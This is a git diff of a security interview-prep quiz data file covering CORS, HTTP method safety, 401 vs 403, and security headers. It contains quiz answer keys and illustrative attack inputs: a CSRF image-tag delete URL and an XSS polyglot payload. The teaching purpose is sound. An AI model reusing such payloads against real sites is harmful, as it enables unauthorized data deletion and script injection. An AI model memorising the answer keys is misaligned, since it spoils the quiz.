@@ -214,15 +214,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Core",
     "interviewTakeaway": "SOP is a client-side boundary enforced strictly by browsers. CORS is not a firewall that stops incoming packets; rather, it tells the client browser whether JavaScript is allowed to consume the response.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"What is Same-Origin Policy (SOP) and how does CORS relax it?\"?",
+      "question": "Which of the following describes the foundational security boundary enforced by the browser's Same-Origin Policy (SOP)?",
       "options": [
-        "Unauthorized origins blocked by browser",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "It prevents scripts executed in one origin from reading DOM trees, cookies, or fetch response data belonging to a different origin (defined by Scheme, Host, Port)",
+        "It acts as a network firewall that halts incoming HTTP requests at the web server if dispatched by an unauthorized domain",
+        "It encrypts cross-origin payloads using TLS so intermediate proxies cannot inspect the transmission",
+        "It disables third-party image, stylesheet, and script embedding (<img src>, <script src>) across all web applications"
       ],
       "correctIndex": 0,
-      "explanation": "SOP is a client-side boundary enforced strictly by browsers. CORS is not a firewall that stops incoming packets; rather, it tells the client browser whether JavaScript is allowed to consume the response."
+      "explanation": "SOP is enforced strictly within the browser JavaScript sandbox based on the (Protocol, Host, Port) tuple. Browsers still transmit simple cross-origin requests, but prohibit JavaScript from inspecting or reading the response payload unless the destination server explicitly opts in via CORS headers."
     }
   },
   {
@@ -270,27 +270,28 @@ export const questionsData: QuestionData[] = [
         "whatIsHappeningText": "Step 1: Safe methods like GET and HEAD must never alter server resource state, enabling browser prefetching and CDN caching.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "Safe Method (RFC 9110)",
+            "definition": "HTTP methods whose defined semantics are essentially read-only, producing no side-effects on resource state."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "Browser Prefetching",
+            "definition": "Browser optimization that proactively fetches link targets before navigation occurs."
           }
         ],
-        "deepExplanation": "The authentication service verifies the user identity against password hashes, computes claims (sub, exp, iss, roles), and signs the payload with its private asymmetric key.",
-        "whyItMatters": "Establishes cryptographic proof of identity without storing server-side session state.",
-        "securityVerdict": "Stateless tokens allow horizontal scaling across distributed microservices.",
+        "deepExplanation": "RFC 9110 Section 9.2.1 explicitly defines GET, HEAD, OPTIONS, and TRACE as safe methods. Because their semantics are purely observational, proxies, CDNs, and browser background pre-render engines can aggressively cache and prefetch them without risking unauthorized database alterations.",
+        "whyItMatters": "Web accelerators and search crawlers rely on safe semantics to index pages without triggering destructive side effects.",
+        "securityVerdict": "Read-only semantics protect resources from unintended background execution.",
         "telemetry": {
-          "protocol": "HTTP/2 TLS 1.3",
-          "method": "POST /auth/login",
+          "protocol": "HTTP/2 (RFC 9110 Semantics)",
+          "method": "GET /orders/123",
           "headers": [
-            "Host: api.auth.io",
-            "Content-Type: application/json"
+            "Host: api.retail.com",
+            "Sec-Purpose: prefetch",
+            "Accept: application/json"
           ],
-          "payloadPreview": "{\"username\": \"admin@company.com\", \"password\": \"••••••••\"}",
-          "securityAction": "Validates credentials against database Argon2id hash; generates signed RS256 JWT.",
-          "statusBadge": "200 OK"
+          "payloadPreview": "{ \"orderId\": 123, \"status\": \"shipped\", \"total\": 89.50 }",
+          "securityAction": "Gateway verifies read-only intent. Response returned from CDN edge cache without database mutation.",
+          "statusBadge": "200 OK (CACHED)"
         }
       },
       {
@@ -305,28 +306,28 @@ export const questionsData: QuestionData[] = [
         "whatIsHappeningText": "Step 2: Anti-pattern: Web crawlers, link pre-fetchers, or <img> tags trigger unintended deletions without CSRF protection.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "State-Mutating GET",
+            "definition": "An anti-pattern where a GET endpoint alters persistent database state rather than retrieving data."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Zero-Click CSRF",
+            "definition": "Triggering unauthorized actions by embedding state-mutating URLs inside <img> or <script> tags on third-party sites."
           }
         ],
-        "deepExplanation": "The Header and Payload are Base64URL-encoded and passed to the RS256 cryptographic signing engine. The resulting 3-part token (Header.Payload.Signature) is returned to the client.",
-        "whyItMatters": "Any tampering with header or payload invalidates the signature instantly upon verification.",
-        "securityVerdict": "Cryptographic non-repudiation ensures token integrity across the network.",
+        "deepExplanation": "Mapping state-changing operations to GET violates fundamental HTTP specifications. If an attacker embeds <img src='https://app.com/users/delete?id=5'> on an external forum, every authenticated victim whose browser loads the image will automatically dispatch ambient cookies and delete records without user consent.",
+        "whyItMatters": "Exposes sensitive operations to automated search bots, anti-virus email scanners, and simple CSRF image probes.",
+        "securityVerdict": "Critical architectural flaw: state changes on GET bypass standard anti-CSRF protections.",
         "telemetry": {
-          "protocol": "Cryptographic Engine (RS256)",
-          "method": "JWT Generation",
+          "protocol": "HTTP/1.1 Ambient Cookie Dispatch",
+          "method": "GET /users/delete?id=5",
           "headers": [
-            "alg: RS256",
-            "typ: JWT",
-            "kid: auth-key-2026-q1"
+            "Host: app.com",
+            "Referer: https://malicious-forum.com",
+            "Cookie: session_id=s_9841203"
           ],
-          "payloadPreview": "{\"sub\": \"user_491\", \"role\": \"engineer\", \"exp\": 1775038400}",
-          "securityAction": "Asymmetric signature generated using Auth Server Private Key (RSA 2048-bit).",
-          "statusBadge": "TOKEN SIGNED"
+          "payloadPreview": "❌ Critical Side-Effect: Resource deleted via unverified GET navigation.",
+          "securityAction": "Server executed permanent deletion from a read-only HTTP verb without CSRF token verification.",
+          "statusBadge": "200 DELETED (VULNERABLE)"
         }
       },
       {
@@ -341,27 +342,27 @@ export const questionsData: QuestionData[] = [
         "whatIsHappeningText": "Step 3: Idempotent methods (PUT, DELETE) produce identical server state regardless of whether they execute 1 time or 100 times.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "Idempotent Method (RFC 9110)",
+            "definition": "An HTTP method where multiple identical requests produce the exact same server state as a single request."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "State Invariance",
+            "definition": "Guarantee that network retry retransmissions will not create duplicate records or alter final outcomes."
           }
         ],
-        "deepExplanation": "The client application supplies the Bearer JWT in the standard Authorization header over a secure TLS channel to access protected microservice resources.",
-        "whyItMatters": "Microservices do not require shared database connections to verify user authorization.",
-        "securityVerdict": "Standardized token transport allows seamless multi-tier API gateway routing.",
+        "deepExplanation": "RFC 9110 Section 9.2.2 defines idempotency. While the HTTP status code may vary between initial call (204 No Content) and subsequent calls (404 Not Found), the side effect on the server state is identical: user 5 remains removed. This allows network layers and clients to safely retry dropped connections without data corruption.",
+        "whyItMatters": "Enables distributed systems to handle network partitions and dropped packets gracefully through safe re-transmission.",
+        "securityVerdict": "Idempotency prevents race conditions and duplicate mutations during client connection retries.",
         "telemetry": {
-          "protocol": "HTTP/2 Bearer Authorization",
-          "method": "GET /v1/cloud/resources",
+          "protocol": "HTTP/2 REST Semantics",
+          "method": "DELETE /users/5",
           "headers": [
-            "Authorization: Bearer eyJhbGciOiJSUzI1NiIs...",
-            "Host: gateway.company.com"
+            "Authorization: Bearer eyJhbGciOi...",
+            "If-Match: \"e2a8903c\""
           ],
-          "payloadPreview": "(Encrypted TLS Transmission with Bearer token)",
-          "securityAction": "Client attaches Bearer token in standard HTTP Authorization header.",
-          "statusBadge": "DISPATCHED"
+          "payloadPreview": "{ \"status\": \"resource_deleted\", \"targetId\": 5 }",
+          "securityAction": "Controller confirms target identity. Entity removed; consecutive retries produce identical final state.",
+          "statusBadge": "204 NO CONTENT"
         }
       },
       {
@@ -377,27 +378,28 @@ export const questionsData: QuestionData[] = [
         "whatIsHappeningText": "Step 4: Interview line: \"Safe methods guarantee no side-effects, idempotent methods guarantee repeatable end states, and mutating POST APIs require client-generated idempotency keys to prevent duplicate billing during network retries.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Idempotency-Key Header",
+            "definition": "A client-supplied unique identifier (UUID v4) used by servers to recognize and deduplicate retry attempts."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "Distributed Lock (SETNX)",
+            "definition": "An atomic caching mechanism (e.g. in Redis) preventing concurrent duplicate transaction execution."
           }
         ],
-        "deepExplanation": "The resource server fetches the public key from the Auth server's JWKS endpoint (or cached memory). It verifies the RS256 signature and asserts that 'exp' > current_time and 'iss' matches the trusted auth provider.",
-        "whyItMatters": "Zero database calls needed for authentication verification, enabling microsecond latency.",
-        "securityVerdict": "Asymmetric signature verification guarantees tamper-proof decentralized auth.",
+        "deepExplanation": "Because POST operations (e.g. processing credit cards) are neither safe nor idempotent, payment gateways require a client-generated UUID in the Idempotency-Key header. The gateway acquires an atomic lock in Redis (SET key value NX PX 120000). If a network timeout prompts the client to retry with the same key, the gateway retrieves and returns the cached response rather than billing twice.",
+        "whyItMatters": "Prevents double-charging customers during cellular network handoffs or timeout retries in distributed financial systems.",
+        "securityVerdict": "Idempotency key architecture bridges non-idempotent business logic with reliable network retries.",
         "telemetry": {
-          "protocol": "JWKS Verification Subsystem",
-          "method": "Public Key Signature Audit",
+          "protocol": "HTTP/2 Financial API Layer",
+          "method": "POST /v1/charges",
           "headers": [
-            "kid: auth-key-2026-q1 (cached)",
-            "Signature: Verified ✓"
+            "Idempotency-Key: 9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d",
+            "Content-Type: application/json",
+            "Authorization: Bearer sec_live_..."
           ],
-          "payloadPreview": "Decoded claims: { sub: 'user_491', role: 'engineer', valid: true }",
-          "securityAction": "Resource server uses Auth Public Key (JWKS) to verify signature and check exp timestamp.",
-          "statusBadge": "200 AUTHORIZED"
+          "payloadPreview": "{\"amount\": 4900, \"currency\": \"usd\", \"customer\": \"cus_L083K\"}",
+          "securityAction": "Redis SETNX lock acquired. Charge processed; cached response bound to UUID key for 24h replay window.",
+          "statusBadge": "201 CREATED (DEDUPLICATED)"
         }
       }
     ],
@@ -434,15 +436,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Core",
     "interviewTakeaway": "Strictly enforce POST, PUT, PATCH, and DELETE for state modifications. Protect non-idempotent POST operations (such as payment processing) with UUID Idempotency-Key headers stored in Redis with TTLs.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"What are safe vs idempotent HTTP methods, and why are state-mutating GETs dangerous?\"?",
+      "question": "Why does the HTTP specification (RFC 9110) strictly prohibit mapping state-mutating actions (like account deletion or password reset) to the GET method?",
       "options": [
-        "Idempotency-Key: uuid-v4 (Deduplication)",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Because GET is defined as safe and cacheable; search crawlers, browser prefetchers, and ambient <img> tags will trigger irreversible mutations without user interaction",
+        "Because GET requests cannot include query parameters or query strings under standard HTTP parsing rules",
+        "Because web application firewalls (WAFs) automatically block all GET requests that contain database queries",
+        "Because TLS certificates do not encrypt headers or URLs sent over GET connections"
       ],
       "correctIndex": 0,
-      "explanation": "Strictly enforce POST, PUT, PATCH, and DELETE for state modifications. Protect non-idempotent POST operations (such as payment processing) with UUID Idempotency-Key headers stored in Redis with TTLs."
+      "explanation": "RFC 9110 specifies GET as a safe, read-only method. Browsers, CDNs, and email scanners treat GET as side-effect-free, prefetching links automatically. Furthermore, GET requests execute automatically via HTML tags (<img src='...'>) with ambient credentials, bypassing CSRF protections."
     }
   },
   {
@@ -490,28 +492,28 @@ export const questionsData: QuestionData[] = [
         "whatIsHappeningText": "Step 1: Client attempts to access a protected route without credentials or with an expired/invalid JWT token.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "Authentication (AuthN)",
+            "definition": "The process of verifying the claimed identity of a user, service, or client system ('Who are you?')."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "Authorization (AuthZ)",
+            "definition": "The process of verifying whether an authenticated identity has permission to perform an action ('What can you do?')."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "The client dispatches an HTTP request against a protected administrative endpoint without providing authentication credentials (such as an Authorization: Bearer token or session cookie). The application's entrypoint filter intercepts the request to verify caller identity before routing to business logic.",
+        "whyItMatters": "Prevents unauthenticated public traffic from consuming internal API computational resources or accessing private state.",
+        "securityVerdict": "Zero-trust entrypoint: anonymous callers must authenticate before reaching application controllers.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "HTTP/2 REST Gateway",
+          "method": "GET /admin/users",
           "headers": [
-            "Host: api.401.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Host: api.enterprise.io",
+            "User-Agent: ClientApp/2.4",
+            "Accept: application/json"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"AuthN Middleware\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to AuthN Middleware.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "(No Authorization or Cookie header present in request)",
+          "securityAction": "Authentication middleware detects missing credential token. Request halted immediately.",
+          "statusBadge": "AUTHN MISSING"
         }
       },
       {
@@ -526,27 +528,27 @@ export const questionsData: QuestionData[] = [
         "whatIsHappeningText": "Step 2: Authentication failure: The server does not know who the caller is. It returns 401 with a WWW-Authenticate challenge header.",
         "terms": [
           {
-            "term": "401 Unauthorized",
-            "definition": "Authentication failure: Missing or invalid credentials. Requires caller to log in."
+            "term": "HTTP 401 (RFC 9110)",
+            "definition": "Standard response code indicating the request lacks valid authentication credentials for the target resource."
           },
           {
-            "term": "WWW-Authenticate",
-            "definition": "Header returned with 401 challenge indicating required auth scheme."
+            "term": "WWW-Authenticate Header",
+            "definition": "Mandatory response header on 401 indicating the supported authentication scheme (e.g. Bearer, Basic)."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "RFC 9110 Section 15.5.2 mandates that when returning 401 Unauthorized, the server MUST include a WWW-Authenticate header defining the challenge scheme. Despite the historical misnomer 'Unauthorized', 401 strictly means 'Unauthenticated': the server does not know who you are, and you must provide valid credentials.",
+        "whyItMatters": "Informs API clients and automated frontend interceptors to initiate an OAuth login flow or exchange a refresh token.",
+        "securityVerdict": "Clear protocol handshake signaling credential requirement without leaking data.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "RFC 9110 / RFC 6750",
+          "method": "HTTP/1.1 401 Unauthorized",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "WWW-Authenticate: Bearer realm=\"api\", error=\"invalid_token\", error_description=\"Access token missing\"",
+            "Content-Type: application/problem+json"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy AuthN Middleware validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "{\"type\": \"https://api.io/errors/unauthenticated\", \"title\": \"Unauthorized\", \"status\": 401}",
+          "securityAction": "Server returns 401 with Bearer challenge, prompting client-side token acquisition.",
+          "statusBadge": "401 UNAUTHORIZED"
         }
       },
       {
@@ -561,27 +563,27 @@ export const questionsData: QuestionData[] = [
         "whatIsHappeningText": "Step 3: Identity is verified (AuthN passes), but the user role lacks administrative read permissions.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "RBAC (Role-Based Access Control)",
+            "definition": "Access control model where permissions are assigned to roles, and roles are assigned to principals."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "Policy Enforcement Point (PEP)",
+            "definition": "The architectural component that intercepts access requests and enforces decisions made by policy engines."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "The client obtains a valid JWT signed by the authorization server and attaches it as a Bearer token. The authentication filter verifies the RS256 signature, asserts token expiration, and establishes caller identity (sub: 'usr_8412', role: 'viewer'). AuthN succeeds, and execution proceeds to the Authorization engine (PEP).",
+        "whyItMatters": "Separates identity verification from granular permission policy evaluation in multi-tier architectures.",
+        "securityVerdict": "Caller identity verified cryptographically; authorization evaluation begins.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "HTTP/2 Bearer Auth",
+          "method": "GET /admin/users",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Authorization: Bearer eyJhbGciOiJSUzI1NiIs...",
+            "Host: api.enterprise.io"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"AuthZ Policy (PEP)\" }",
-          "securityAction": "Backend service AuthZ Policy (PEP) enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "Decoded claims: { \"sub\": \"usr_8412\", \"role\": \"viewer\", \"iss\": \"auth.io\" }",
+          "securityAction": "Cryptographic signature validated. Caller identified as usr_8412; forwarding to RBAC evaluator.",
+          "statusBadge": "AUTHN VALIDATED"
         }
       },
       {
@@ -597,23 +599,27 @@ export const questionsData: QuestionData[] = [
         "whatIsHappeningText": "Step 4: Interview line: \"401 means Authentication failure — we do not know who you are. 403 means Authorization failure — we know exactly who you are, but you do not possess permission for this resource.\"",
         "terms": [
           {
-            "term": "403 Forbidden",
-            "definition": "Authorization failure: Identity is recognized, but caller lacks necessary privileges."
+            "term": "HTTP 403 (RFC 9110)",
+            "definition": "Response code indicating the server understood the request and verified identity, but refuses authorization."
+          },
+          {
+            "term": "Resource Masking (404 on 403)",
+            "definition": "Defensive technique of returning 404 Not Found to prevent attackers from discovering valid private resource IDs."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "The authorization engine compares the caller's role ('viewer') against the required permission ('admin:users:read') and rejects access. Unlike 401, re-authenticating with the same credentials will not change the outcome. In high-security multi-tenant applications, servers often return 404 instead of 403 to prevent IDOR object enumeration.",
+        "whyItMatters": "Prevents privilege escalation and stops attackers from mapping sensitive internal endpoint boundaries.",
+        "securityVerdict": "Definitive authorization boundary enforced; event recorded in security audit logs.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "RFC 9110 / RFC 7807 Problem Details",
+          "method": "HTTP/1.1 403 Forbidden",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Content-Type: application/problem+json",
+            "X-Content-Type-Options: nosniff"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Always return 401 when the token is missing/expired/tampered. Return 4...\" }",
-          "securityAction": "Final defensive control verified: Enforcement Result secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "{\"type\": \"https://api.io/errors/forbidden\", \"title\": \"Forbidden\", \"detail\": \"Role 'viewer' lacks 'admin:users' permission\"}",
+          "securityAction": "Policy engine denies access. Security audit log records: DENY usr_8412 target=/admin/users.",
+          "statusBadge": "403 FORBIDDEN"
         }
       }
     ],
@@ -650,15 +656,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Core",
     "interviewTakeaway": "Always return 401 when the token is missing/expired/tampered. Return 403 when the valid token lacks required scopes (e.g. read:admin). In high-security multi-tenant systems, you may return 404 instead of 403 to prevent resource enumeration.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"What is the exact security difference between HTTP 401 and 403 status codes?\"?",
+      "question": "In an API interview, how do you explain the architectural difference between HTTP 401 Unauthorized and HTTP 403 Forbidden?",
       "options": [
-        "403 Forbidden (Insufficient Privileges)",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "401 means Authentication failure (unknown identity, requires WWW-Authenticate challenge), while 403 means Authorization failure (identity is verified, but permissions are insufficient)",
+        "401 is used exclusively for expired TLS certificates, while 403 is used for rate limiting and IP blocking",
+        "401 indicates a database server crash, whereas 403 indicates an invalid HTTP request method like TRACE",
+        "401 is returned to mobile clients, while 403 is returned exclusively to desktop browser clients"
       ],
       "correctIndex": 0,
-      "explanation": "Always return 401 when the token is missing/expired/tampered. Return 403 when the valid token lacks required scopes (e.g. read:admin). In high-security multi-tenant systems, you may return 404 instead of 403 to prevent resource enumeration."
+      "explanation": "Per RFC 9110, 401 Unauthorized indicates unauthenticated access where credentials are missing or invalid, requiring a WWW-Authenticate header. 403 Forbidden means the server recognizes the caller's identity, but explicitly refuses permission for the requested resource."
     }
   },
   {
@@ -696,144 +702,146 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Insecure Downgrade Attempt",
-        "from": "network_mitm",
-        "to": "client",
-        "packet": "HTTP 302 -> http://bank.com (SSL Strip)",
-        "caption": "Step 1: Network adversary intercepts plaintext HTTP connection to strip SSL certificates and inspect session cookies.",
-        "status": "attack",
-        "whatIsHappeningTitle": "Step 1: Insecure Downgrade Attempt",
-        "whatIsHappeningText": "Step 1: Network adversary intercepts plaintext HTTP connection to strip SSL certificates and inspect session cookies.",
+        "label": "HSTS Transport Enforcement",
+        "from": "server",
+        "to": "browser",
+        "packet": "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
+        "caption": "Step 1: HSTS forces browsers to communicate strictly over encrypted HTTPS, eliminating SSL stripping (Moxie Marlinspike attack).",
+        "status": "defense",
+        "whatIsHappeningTitle": "Step 1: HSTS Transport Enforcement",
+        "whatIsHappeningText": "Step 1: HSTS forces browsers to communicate strictly over encrypted HTTPS, eliminating SSL stripping (Moxie Marlinspike attack).",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "HSTS (RFC 6797)",
+            "definition": "HTTP Strict Transport Security header informing browsers to connect only via HTTPS for a specified duration."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "SSL Stripping Attack",
+            "definition": "An adversary-in-the-middle attack that intercepts initial plaintext HTTP requests and downgrades connections before HTTPS upgrade."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "RFC 6797 specifies that upon receiving Strict-Transport-Security, compliant browsers remember this policy for the duration of max-age (typically 2 years = 63072000s). Any subsequent user attempt to navigate via http:// is automatically upgraded to https:// internally by the browser before any packet hits the wire.",
+        "whyItMatters": "Eliminates plaintext eavesdropping, coffee-shop Wi-Fi session hijacking, and certificate warning bypasses.",
+        "securityVerdict": "Enforces strict transport security and disables all insecure plaintext fallback pathways.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "RFC 6797 Transport Security",
+          "method": "HTTP/2 Response Header",
           "headers": [
-            "Host: api.essential.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
+            "Server: cloudflare"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Network Threat\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Network Threat.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "(Browser registers domain in internal HSTS pinning database)",
+          "securityAction": "Browser caches HSTS policy. Subsequent http:// requests automatically rewritten to https:// via internal 307 redirect.",
+          "statusBadge": "HSTS ENFORCED"
         }
       },
       {
         "id": 2,
-        "label": "HSTS Enforcement",
-        "from": "edge_waf",
-        "to": "client",
-        "packet": "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
-        "caption": "Step 2: Server sends HSTS header. Browser caches policy and automatically rewrites all future http:// requests to https:// internally.",
+        "label": "Content-Type Sniffing Defense",
+        "from": "server",
+        "to": "browser",
+        "packet": "X-Content-Type-Options: nosniff",
+        "caption": "Step 2: Prevents browsers from MIME-sniffing a user-uploaded image into an executable HTML/JavaScript script tag.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 2: HSTS Enforcement",
-        "whatIsHappeningText": "Step 2: Server sends HSTS header. Browser caches policy and automatically rewrites all future http:// requests to https:// internally.",
+        "whatIsHappeningTitle": "Step 2: Content-Type Sniffing Defense",
+        "whatIsHappeningText": "Step 2: Prevents browsers from MIME-sniffing a user-uploaded image into an executable HTML/JavaScript script tag.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "MIME Sniffing",
+            "definition": "Browser heuristic analysis of file byte contents to guess file types rather than respecting the Content-Type header."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "X-Content-Type-Options",
+            "definition": "Security header instructing the browser to strictly honor the declared Content-Type and refuse sniffing."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "Historically, browsers would inspect file bodies to deduce their format. An attacker could upload an avatar image containing embedded <script>alert(1)</script>. If rendered directly, the browser would 'sniff' it as text/html and execute XSS. 'X-Content-Type-Options: nosniff' forces the browser to respect the server's Content-Type strictly.",
+        "whyItMatters": "Prevents file upload polyglots from turning harmless avatar endpoints into stored XSS vectors.",
+        "securityVerdict": "Disables browser MIME guesswork and closes drive-by script execution pathways.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "W3C Fetch Specification",
+          "method": "HTTP/2 Response Header",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Content-Type: image/png",
+            "X-Content-Type-Options: nosniff"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Network Threat validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "GIF89a/*<script>alert('xss')</script>*/...",
+          "securityAction": "Browser detects script tag inside image/png payload but refrains from execution due to nosniff directive.",
+          "statusBadge": "SNIFFING BLOCKED"
         }
       },
       {
         "id": 3,
-        "label": "MIME Sniffing Blocked",
-        "from": "edge_waf",
-        "to": "client",
-        "packet": "X-Content-Type-Options: nosniff",
-        "caption": "Step 3: Prevents browsers from sniffing MIME types, stopping executable scripts disguised as images or text files.",
+        "label": "Clickjacking & Framing Isolation",
+        "from": "server",
+        "to": "browser",
+        "packet": "Content-Security-Policy: frame-ancestors 'none'",
+        "caption": "Step 3: frame-ancestors 'none' supersedes legacy X-Frame-Options: DENY, completely stopping transparent iframe UI redress attacks.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: MIME Sniffing Blocked",
-        "whatIsHappeningText": "Step 3: Prevents browsers from sniffing MIME types, stopping executable scripts disguised as images or text files.",
+        "whatIsHappeningTitle": "Step 3: Clickjacking & Framing Isolation",
+        "whatIsHappeningText": "Step 3: frame-ancestors 'none' supersedes legacy X-Frame-Options: DENY, completely stopping transparent iframe UI redress attacks.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "CSP frame-ancestors",
+            "definition": "Content Security Policy directive specifying valid parents that may embed a page in <frame>, <iframe>, or <object>."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "Clickjacking",
+            "definition": "Overlaying an invisible iframe of a target app over an enticing button to trick users into triggering actions."
           }
         ],
